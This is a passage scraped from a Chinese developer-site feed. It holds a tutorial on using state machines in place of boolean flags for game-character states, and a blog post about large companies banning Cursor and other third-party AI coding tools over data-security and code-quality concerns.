                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">状态机是什么？</h2>
<p>一句话定义：状态机：把对象的所有可能情况分成互斥的几种"状态"，明确规定状态之间如何切换。</p>
<p>本质上是对实际情况的一种分类讨论。</p>
<h2 data-id="heading-1">为什么需要状态机</h2>
<p>状态机解决的是：同一个对象，在不同状态下，对同一输入的不同响应问题。</p>
<p>想象一个游戏场景，你操作的角色需要进行不同的动作。
假设角色有这些状态：站立、跑步、跳跃、攻击、受击</p>
<p>刚开始的时候，你打算用if-else来解决</p>
<p>先来定义几个变量保存这些状态：</p>
<pre><code class="hljs language-python" lang="python">is_jumping = <span class="hljs-literal">False</span>
is_attacking = <span class="hljs-literal">False</span>
is_running = <span class="hljs-literal">False</span>
is_hurt = <span class="hljs-literal">False</span>
is_standing  = <span class="hljs-literal">False</span>

</code></pre>
<p>根据不同状态进行不同形态的攻击：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">on_attack_button</span>():
    <span class="hljs-keyword">if</span> is_jumping <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> is_attacking <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> is_hurt:
        do_air_attack()
    <span class="hljs-keyword">elif</span> is_running <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> is_attacking <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> is_hurt:
        do_dash_attack()
    <span class="hljs-keyword">elif</span> is_standing <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> is_attacking <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> is_hurt:
        do_normal_attack()
    <span class="hljs-comment"># 还要考虑29种其他组合的合理性</span>

</code></pre>
<p><strong>问题来了：</strong></p>
<ul>
<li>5个布尔变量，理论上有32（2^5）种组合</li>
<li>但"跳跃中同时受击同时攻击"合法吗？</li>
<li>每加一个状态，组合数翻倍</li>
<li>漏掉一个判断就出bug</li>
</ul>
<h2 data-id="heading-2">状态机要素</h2>
<p>状态机的要素分为4个要素，即：现态、条件、动作、次态。
“现态”和“条件”是因，“动作”和“次态”是果。</p>
<p>（1）现态：是指当前所处状态；<br/>
（2）条件：又称为“事件”。当条件被满足时，将会触发一个动作，或者执行一次状态的迁移。<br/>
（3）动作：条件满足后执行的动作。动作不是必须的，当条件满足后，也可以不执行任何动作，直接迁移到新状态。<br/>
（4）次态：条件满足后要迁移往的新状态。“次态”是相对于“现态”而言的，“次态”一旦被激活，就转变成新的“现态”了。</p>
<h2 data-id="heading-3">用状态机来解决这个问题</h2>
<p>核心思路：<strong>任何时刻，角色只能处于一个状态</strong></p>
<p>因此很自然的，我们定义一个变量表示角色的状态：</p>
<pre><code class="hljs language-python" lang="python">state = <span class="hljs-string">"站立"</span>  <span class="hljs-comment"># 只有一个变量</span>
</code></pre>
<p>从状态到状态的转换，我们也需要定义：</p>














































































































<table><thead><tr><th align="center">状态（现态）</th><th align="center">状态描述</th><th align="center">条件（事件）</th><th align="center">动作</th><th align="center">次态</th></tr></thead><tbody><tr><td align="center">站立</td><td align="center">默认待机状态</td><td align="center">按方向键</td><td align="center">播放跑步动画</td><td align="center">跑步</td></tr><tr><td align="center"/><td align="center"/><td align="center">按跳跃键</td><td align="center">播放跳跃动画</td><td align="center">跳跃</td></tr><tr><td align="center"/><td align="center"/><td align="center">按攻击键</td><td align="center">播放攻击动画</td><td align="center">攻击</td></tr><tr><td align="center"/><td align="center"/><td align="center">被打中</td><td align="center">播放受击动画</td><td align="center">受击</td></tr><tr><td align="center">跑步</td><td align="center">水平移动中</td><td align="center">松开方向键</td><td align="center">-</td><td align="center">站立</td></tr><tr><td align="center"/><td align="center"/><td align="center">按跳跃键</td><td align="center">播放跳跃动画</td><td align="center">跳跃</td></tr><tr><td align="center"/><td align="center"/><td align="center">按攻击键</td><td align="center">播放攻击动画</td><td align="center">攻击</td></tr><tr><td align="center"/><td align="center"/><td align="center">被打中</td><td align="center">播放受击动画</td><td align="center">受击</td></tr><tr><td align="center">跳跃</td><td align="center">空中状态</td><td align="center">落地</td><td align="center">-</td><td align="center">站立</td></tr><tr><td align="center"/><td align="center"/><td align="center">按攻击键</td><td align="center">播放空中攻击动画</td><td align="center">攻击</td></tr><tr><td align="center"/><td align="center"/><td align="center">被打中</td><td align="center">播放受击动画</td><td align="center">受击</td></tr><tr><td align="center">攻击</td><td align="center">攻击动作中</td><td align="center">动画结束</td><td align="center">-</td><td align="center">站立</td></tr><tr><td align="center"/><td align="center"/><td align="center">被打中</td><td align="center">播放受击动画</td><td align="center">受击</td></tr><tr><td align="center">受击</td><td align="center">受击硬直中</td><td align="center">硬直结束</td><td align="center">-</td><td align="center">站立</td></tr></tbody></table>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart LR
    subgraph 基础状态
        站立[站立]
        跑步[跑步]
    end
    
    subgraph 动作状态
        跳跃[跳跃]
        攻击[攻击]
        受击[受击]
    end
    
    站立 --&gt;|方向键| 跑步
    跑步 --&gt;|松开| 站立
    
    站立 --&gt;|跳跃键| 跳跃
    跑步 --&gt;|跳跃键| 跳跃
    跳跃 --&gt;|落地| 站立
    
    站立 --&gt;|攻击键| 攻击
    跑步 --&gt;|攻击键| 攻击
    跳跃 --&gt;|攻击键| 攻击
    攻击 --&gt;|动画结束| 站立
    
    站立 --&gt;|被打中| 受击
    跑步 --&gt;|被打中| 受击
    跳跃 --&gt;|被打中| 受击
    攻击 --&gt;|被打中| 受击
    受击 --&gt;|硬直结束| 站立

</code></pre>
<p>最后我们来实现不同形态的攻击（按攻击键）：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">on_attack_button</span>():
    <span class="hljs-keyword">if</span> state == <span class="hljs-string">"站立"</span>:
	    <span class="hljs-comment"># 站立时的攻击</span>
        do_normal_attack()
        state = <span class="hljs-string">"攻击"</span>
    <span class="hljs-keyword">elif</span> state == <span class="hljs-string">"跑步"</span>:
	    <span class="hljs-comment"># 跑步时的攻击</span>
        do_dash_attack()
        state = <span class="hljs-string">"攻击"</span>
    <span class="hljs-keyword">elif</span> state == <span class="hljs-string">"跳跃"</span>:
	    <span class="hljs-comment"># 跳跃时的攻击</span>
        do_air_attack()
        state = <span class="hljs-string">"攻击"</span>
    <span class="hljs-comment"># 其他状态按攻击键无效，不用写</span>
</code></pre>
<h2 data-id="heading-4">对比</h2>

























<table><thead><tr><th/><th>布尔变量组合</th><th>状态机</th></tr></thead><tbody><tr><td>5个状态</td><td>最多32种组合要考虑</td><td>只有5种情况</td></tr><tr><td>加新状态</td><td>所有if都要检查</td><td>只加新状态的转换</td></tr><tr><td>非法情况</td><td>要手动排除</td><td>根本不存在</td></tr></tbody></table>
<h2 data-id="heading-5">总结</h2>
<p>代码的核心思路转变就是：</p>
<blockquote>
<p>从"用多个变量组合描述状态"到"用单一变量明确状态"</p>
</blockquote>
<p>核心难点是 如何定义状态 以做到互斥。</p>
<h3 data-id="heading-6"><strong>延伸</strong></h3>
<ul>
<li>状态很多时（几十个），考虑分层状态机</li>
<li>需要同时处于多个状态时，考虑并行状态机</li>
<li>实际项目中，状态机常用字典映射或状态模式实现，比if-elif更易维护</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[全面封禁 Cursor！又一家大厂出手了]]></title>    <link>https://juejin.cn/post/7584110439933100078</link>    <guid>https://juejin.cn/post/7584110439933100078</guid>    <pubDate>2025-12-16T07:43:19.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7584110439933100078" data-draft-id="7584203412196671514" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="全面封禁 Cursor！又一家大厂出手了"/> <meta itemprop="keywords" content="Cursor,AI编程,程序员"/> <meta itemprop="datePublished" content="2025-12-16T07:43:19.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="程序员鱼皮"/> <meta itemprop="url" content="https://juejin.cn/user/2444938365386621"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            全面封禁 Cursor！又一家大厂出手了
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2444938365386621/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    程序员鱼皮
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T07:43:19.000Z" title="Tue Dec 16 2025 07:43:19 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>大家好，我是程序员鱼皮。</p>
<p>最近，有网友爆料称：<strong>快手的研发线发布通知，收紧了对第三方编程软件的使用权限</strong>。</p>
<p>不少同学发现，只要在自己办公电脑上点开 Cursor，就直接闪退，压根儿用不了。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/19b9b782d2874e92be66eef9f596c534~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766475798&amp;x-signature=YO%2FV8SHOxRmR%2FS5W9da%2BOs7OYhA%3D" alt="" loading="lazy"/></p>
<p>我都能想象到这些同学有多痛苦，本来可能计划好了下午 1 个小时用 AI 把代码生成完，然后摸 5 个小时的鱼。结果午休一觉醒来发现天塌了，先是对着屏幕发了一会儿呆，然后开始上网找代码模板、翻文档查 API，能不能按时完成工作都是未知数。。。</p>
<p>有员工调侃：没 Cursor 的日子，我连 Hello World 都写不顺了！</p>
<p>毕竟很多人已经深度习惯了 AI 辅助开发，如果真的回到手搓时代，确实很难适应。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8eb421a361dd427d8c084db63f899082~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766475798&amp;x-signature=wRXLj4rtPiQi%2FMlD%2Bi1d0GWO%2BZg%3D" alt="" loading="lazy"/></p>
<p>但其实这波限制第三方 AI 编程工具的操作，早就不是个例了。</p>
<p>今年 5 月，字节跳动就发布了内部邮件：自 6 月 30 日起，将分批次禁用 Cursor、Windsurf 等第三方 AI 编程软件，转而推广自研的编程助手 Trae。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d0536bbdd10a4e60a2ceebce2c5c0c39~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766475798&amp;x-signature=1WgNsvEalXgyizSLtFKXz0dBf0Q%3D" alt="" loading="lazy"/></p>
<p>当时字节给出的理由主要有 2 个：</p>
<ol start="0">
<li>不少员工通过个人账户采购这些工具，数据沉淀到个人账户，不符合公司数据安全管理规范</li>
<li>部分第三方工具和模型（比如 Claude）尚未在中国区提供正式服务，存在合规风险</li>
</ol>
<p>结果这个消息在圈内传得沸沸扬扬，尤其是字节的程序员炸锅了。有人觉得毕竟字节要推自己的 Trae 嘛，禁用第三方工具也算是情理之中。但关键是当时 TRAE 和 Cursor 差距较大，所以有厂友吐槽：如果逼着用Trae，那宁可不用AI。天天在那里提示纯属帮倒忙，不仅降低生产力还影响心情。</p>
<p>还有更狠的 DISS：外面的蟠桃不给吃，逼着让吃自家的猪饲料。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6dd257e3dd9e4188855619b587c0f3cb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766475798&amp;x-signature=UlBOsBZuhqWqKD%2BLHGgzj%2BbI1a0%3D" alt="" loading="lazy"/></p>
<p>后来字节又补充说明，如果第三方工具符合法律法规、支持租户管理和数据管控，通过审核后还是可以申请使用的。只不过大部分人都被引导去用 Trae 了。</p>
<p>除了国内大厂，像亚马逊在今年 11 月要求员工优先使用自研的 AI 编程工具 Kiro，并明确表示将不再支持任何新增的第三方 AI 开发工具。还有今年 9 月，微软全面禁止员工使用 DeepSeek 相关应用，强制推广自家的 GitHub Copilot。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/30cb57db6b134d1ca51a207d86e138ec~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766475798&amp;x-signature=1xQwjFZwHuiYCmgGP7T66lkIlTM%3D" alt="" loading="lazy"/></p>
<p>看到这里你可能会想，这些大厂是不是太保守了？AI 编程工具明明能大幅提升效率，为啥要禁？真的只是为了推广自家的产品么？</p>
<p>我觉得首要原因是 <strong>考虑安全性</strong>。</p>
<p>对于大厂来说，代码不仅仅是代码，更是企业的核心资产、是商业机密。一旦泄露，损失无法估量。</p>
<p>而 Cursor、Copilot 这类 AI 编程工具，默认会将用户输入发送至云端模型进行推理。你写的每一行注释、每一段未提交的草稿，都可能在不经意间离开企业边界。</p>
<p>再仔细想一想，这些工具背后的大模型训练数据来自哪里？会不会用你的代码继续训练？这些问题都是大厂必须考虑的。</p>
<p>能用 AI 开发都已经算是好的了，有些公司对安全的把控更严格，比如位于深圳的 ICT、计算头部企业，一直秉持着 <strong>内部信息不上网</strong> 的原则。任何向外部网络上传文件的行为，都被从底层程序上禁止了。</p>
<p>想象一下，明明外面的世界如此发达，却要把你关在一个禁网的小黑屋里写代码，这才是真的痛苦。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/95bc70bc5e0d4999994d113a8dbaa1c1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766475798&amp;x-signature=9nEX9JORmYZnBzYUc2dHftYqsNE%3D" alt="" loading="lazy"/></p>
<p>除了数据安全，还有个现实问题：<strong>AI 生成的代码质量参差不齐</strong>。</p>
<p>“如果一个函数你写了 90%，剩下 10% 让 AI 去生成，它能给你把前面 90% 的代码全部改错。”</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/63387e05e38e4868833017fb3f826e33~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766475798&amp;x-signature=dbY2QSbKmRsJFxRuBYobXHAKiig%3D" alt="" loading="lazy"/></p>
<p>你可以把这句话当个笑话听，只要它不发生在自己身上。</p>
<p>AI 确实能提效，但如果完全依赖 AI、不审查代码就提交，很容易出现线上事故。<strong>而对于大厂来说，即使效率低一点，也必须保证代码安全。</strong></p>
<p>关注我的朋友也应该知道，今年互联网出现了多少 P0 级重大故障？很难说背后是不是 AI 的锅。<strong>但 AI 是无法被追责的，给 AI 擦屁股的只有用 AI 的我们自己。</strong></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/02a8d75b46b9475695744a150462e01d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766475798&amp;x-signature=JmuL3ISo4MakEW7%2FwReVtAIkRPc%3D" alt="" loading="lazy"/></p>
<p>最后我想说，AI 编程已经成为大趋势。就拿《腾讯 2025 研发大数据报告》中的数据来说，腾讯 <strong>超过 90% 的程序员</strong> 正在使用 AI 编程助手辅助写代码。更夸张的是，2025 年全公司有 <strong>50% 的新增代码</strong> 由 AI 辅助生成。也就是说，每两行代码，就有一行来自 AI。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/98436abe2c294575ba22894c402175dd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766475798&amp;x-signature=rJp99hJurApUbczKzlFD%2FksXxCo%3D" alt="" loading="lazy"/></p>
<p>即使你所在的公司禁用了 Cursor 等 AI 工具和某些大模型，你自己也应该积极学习 AI 编程工具，<strong>而且要用最新的</strong>，这直接关乎你未来的竞争力。就跟打游戏一样，你拿历史版本的 T0 去打这个版本的 T0，不就会被吊着打么？</p>
<p>AI 发展非常迅速，每天都有新东西，可能 1 个月不关注，你用的工具和大模型就落后几个版本了。所以我也做了个 <a href="https://link.juejin.cn?target=https%3A%2F%2Fai.codefather.cn%2F" target="_blank" title="https://ai.codefather.cn/" ref="nofollow noopener noreferrer">AI 导航网站</a>，帮大家更快获取到最新的 AI 学习资源、工具大全、资讯等等。感兴趣的同学可以免费使用~</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d9b33f089401454992169d27d302d5de~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766475798&amp;x-signature=iOplnnGImosAVh0k74MVkWrDM%2FQ%3D" alt="鱼皮AI导航网 ai.codefather.cn" loading="lazy"/></p>
<h2 data-id="heading-0">更多</h2>
<p>💻 编程学习交流：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fliyupi%2Fcode-nav" target="_blank" title="https://github.com/liyupi/code-nav" ref="nofollow noopener noreferrer">编程导航</a> 📃 简历快速制作：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fliyupi%2Flaoyujianli" target="_blank" title="https://github.com/liyupi/laoyujianli" ref="nofollow noopener noreferrer">老鱼简历</a> ✏️ 面试刷题神器：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fliyupi%2Fmianshiya" target="_blank" title="https://github.com/liyupi/mianshiya" ref="nofollow noopener noreferrer">面试鸭</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[注意力机制在Code Agent的应用]]></title>    <link>https://juejin.cn/post/7584061465398509609</link>    <guid>https://juejin.cn/post/7584061465398509609</guid>    <pubDate>2025-12-16T07:35:02.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7584061465398509609" data-draft-id="7584110439933001774" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="注意力机制在Code Agent的应用"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2025-12-16T07:35:02.000Z"/> <meta itemprop="image" 